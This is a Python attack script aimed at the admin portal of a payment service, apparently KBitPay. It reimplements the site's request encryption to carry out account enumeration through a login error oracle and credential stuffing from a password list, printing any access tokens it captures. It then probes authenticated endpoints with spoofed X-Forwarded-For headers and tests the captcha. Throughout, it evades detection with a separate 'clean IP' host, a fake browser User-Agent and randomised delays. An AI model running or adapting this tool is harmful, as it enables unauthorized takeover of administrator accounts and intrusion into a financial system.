#!/usr/bin/env python3
"""KBitPay admin portal API probe (stdlib + openssl subprocess crypto).

Runs on git.keepbit.xyz (egress with clean IP) against https://admin.kbitpay.com.
Reimplements the SPA crypto: GET /api/webv1/Common/GetRsaPublicKey -> RSA-PKCS1v1.5
encrypt JSON {key,iv} -> encryptKey; AES-256-CBC/PKCS7 encrypt body -> encryptData.

Modes:
  oracle  - for each email in /tmp/kbp_emails.txt: encrypted Login with wrong pwd,
            isAdmin=true, appID='' -> print ErrCode/ErrMsg (registered vs not)
  login   - for each "email|pwd" line in /tmp/kbp_creds.txt: encrypted Login with
            pwd=base64(pwd) -> print result; on Success print AccessToken
  enum    - for each "METHOD|path|body" line in /tmp/kbp_enum.txt: request with
            Bearer token (arg) -> print status + body excerpt

All requests low-rate (random 8-15s sleeps). Read-only: no write endpoints.
"""
import base64, json, os, random, subprocess, sys, time, urllib.request, urllib.error

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
APPID = os.environ.get("KBP_APPID", "")
ISADMIN = os.environ.get("KBP_ISADMIN", "true").lower() != "false"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")


def http(method, path, data=None, headers=None, timeout=35):
    hdrs = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8"}
    if headers:
        hdrs.update(headers)
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(BASE + path, method=method, data=body, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, "ERR:" + str(e)


def run_openssl(args, inp):
    p = subprocess.run(["openssl"] + args, input=inp, capture_output=True, timeout=30)
    if p.returncode != 0:
        raise RuntimeError("openssl %s failed: %s" % (args[0], p.stderr.decode()[:200]))
    return p.stdout


def rsa_encrypt(pub_pem, plain):
    with open("/tmp/kbp_pub.pem", "w") as f:
        f.write(pub_pem)
    # try rsautl (openssl 1.1/3.x), fallback pkeyutl
    for args in (["rsautl", "-encrypt", "-pubin", "-inkey", "/tmp/kbp_pub.pem"],
                 ["pkeyutl", "-encrypt", "-pubin", "-inkey", "/tmp/kbp_pub.pem",
                  "-pkeyopt", "rsa_padding_mode:pkcs1"]):
        try:
            return run_openssl(args, plain)
        except RuntimeError:
            continue
    raise RuntimeError("RSA encrypt failed")


def aes_enc(key, iv, plain):
    return run_openssl(["enc", "-aes-256-cbc", "-K", key.hex(), "-iv", iv.hex(),
                        "-base64", "-A"], plain).decode().strip()


def aes_dec(key, iv, b64str):
    return run_openssl(["enc", "-d", "-aes-256-cbc", "-K", key.hex(), "-iv", iv.hex(),
                        "-base64", "-A"], b64str.encode()).decode("utf-8", "ignore")


class Client:
    def __init__(self):
        self.key_id = None
        self.key = None
        self.iv = None
        self.pub = None

    def fetch_key(self):
        st, raw = http("GET", "/api/webv1/Common/GetRsaPublicKey")
        d = json.loads(raw)
        rd = d.get("ResData") or d.get("resData") or d
        self.key_id = rd["KeyId"]
        self.pub = rd["PublicKey"]
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        return d

    def post_enc(self, path, obj, headers=None):
        if not self.key_id:
            self.fetch_key()
        body = json.dumps(obj, ensure_ascii=False).encode()
        enc_data = aes_enc(self.key, self.iv, body)
        enc_key = rsa_encrypt(self.pub, json.dumps(
            {"key": base64.b64encode(self.key).decode(),
             "iv": base64.b64encode(self.iv).decode()}).encode())
        payload = {"keyId": self.key_id,
                   "encryptKey": base64.b64encode(enc_key).decode(),
                   "encryptData": enc_data}
        st, raw = http("POST", path, json.dumps(payload), headers=headers)
        try:
            d = json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}
        if isinstance(d, dict):
            if d.get("encryptData"):
                try:
                    inner = json.loads(aes_dec(self.key, self.iv, d["encryptData"]))
                    d["_decrypted"] = inner
                except Exception:
                    pass
            rd = d.get("ResData")
            if isinstance(rd, str):
                try:
                    d["ResData"] = json.loads(aes_dec(self.key, self.iv, rd))
                except Exception:
                    pass
        return d

    def get(self, path, headers=None):
        st, raw = http("GET", path, headers=headers)
        try:
            return json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}


def pause():
    time.sleep(random.uniform(8, 15))


def read_lines(p):
    with open(p) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "oracle"
    c = Client()
    print("[*] base=%s mode=%s" % (BASE, mode), flush=True)
    try:
        c.fetch_key()
        print("[*] key ok KeyId=%s" % c.key_id, flush=True)
    except Exception as e:
        print("[!] fetch_key failed: %s" % e, flush=True)
        sys.exit(1)

    if mode == "oracle":
        emails = read_lines("/tmp/kbp_emails.txt")
        for em in emails:
            pwd = "WrongPwd%d!" % random.randint(1000, 9999)
            r = c.post_enc("/api/Login/Login", {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                                                 "email": em, "isAdmin": ISADMIN, "language": "en"})
            print("ORACLE %s -> ErrCode=%s ErrMsg=%s Success=%s" % (
                em, r.get("ErrCode"), r.get("ErrMsg"), r.get("Success")), flush=True)
            if "4047" in str(r.get("ErrCode")):
                print("[!] git-egress IP throttled - STOP", flush=True)
                break
            pause()

    elif mode == "login":
        creds = read_lines("/tmp/kbp_creds.txt")
        for line in creds:
            em, pw = line.split("|", 1)
            r = c.post_enc("/api/Login/Login", {"appID": APPID, "pwd": base64.b64encode(pw.encode()).decode(),
                                                 "email": em, "isAdmin": ISADMIN, "language": "en"})
            rd = r.get("ResData")
            tok = ""
            if isinstance(rd, dict):
                tok = rd.get("AccessToken") or ""
            print("LOGIN %s -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
                em, r.get("ErrCode"), r.get("ErrMsg"), r.get("Success"),
                (tok[:80] + "...") if tok else ""), flush=True)
            if tok:
                print("TOKEN %s" % tok, flush=True)
            if "4047" in str(r.get("ErrCode")):
                print("[!] git-egress IP throttled - STOP", flush=True)
                break
            pause()

    elif mode == "enum":
        token = sys.argv[2] if len(sys.argv) > 2 else ""
        if not token:
            print("[!] need token arg", flush=True)
            sys.exit(1)
        hdr = {"Authorization": "Bearer " + token}
        for line in read_lines("/tmp/kbp_enum.txt"):
            parts = line.split("|", 3)
            m, path = parts[0], parts[1]
            body = parts[2] if len(parts) > 2 else ""
            xff = parts[3].strip() if len(parts) > 3 else ""
            h = dict(hdr)
            if xff:
                h["X-Forwarded-For"] = xff
            try:
                if m == "GET":
                    r = c.get(path, headers=h)
                else:
                    r = c.post_enc(path, json.loads(body) if body else {}, headers=h)
                s = json.dumps(r, ensure_ascii=False)
                print("ENUM %s %s XFF=%s -> %s" % (m, path, xff or "-", s[:4000]), flush=True)
            except Exception as e:
                print("ENUM %s %s -> ERR %s" % (m, path, e), flush=True)
            if isinstance(r, dict) and "4047" in str(r.get("ErrCode")):
                print("[!] git-egress IP throttled - STOP", flush=True)
                break
            pause()


    elif mode == "chk":
        em = sys.argv[2] if len(sys.argv) > 2 else ""
        if not em:
            print("[!] need email arg", flush=True)
            sys.exit(1)
        r1 = c.get("/api/Login/CheckLastLogin?email=" + em)
        print("CHK %s CheckLastLogin -> %s" % (em, json.dumps(r1, ensure_ascii=False)[:400]), flush=True)
        pause()
        r2 = c.get("/api/Login/Verification")
        print("CHK Verification -> %s" % json.dumps(r2, ensure_ascii=False)[:250], flush=True)
        key = ""
        try:
            rd = r2.get("ResData") or r2.get("resData") or {}
            if isinstance(rd, dict):
                key = rd.get("Key") or rd.get("key") or ""
            elif isinstance(rd, str):
                rd2 = json.loads(rd)
                key = rd2.get("Key") or rd2.get("key") or ""
        except Exception:
            pass
        pause()
        r3 = c.post_enc("/api/Login/Login", {"appID": APPID, "pwd": base64.b64encode(b"WrongPwd9999!").decode(),
            "email": em, "isAdmin": ISADMIN, "language": "en", "verificationCode": "0000", "verificationKey": key})
        print("CHK %s Login(wrongpwd+dummycap) -> ErrCode=%s ErrMsg=%s Success=%s" % (
            em, r3.get("ErrCode"), r3.get("ErrMsg"), r3.get("Success")), flush=True)
        print("[*] done", flush=True)
        return

    print("[*] done", flush=True)


if __name__ == "__main__":
    main()
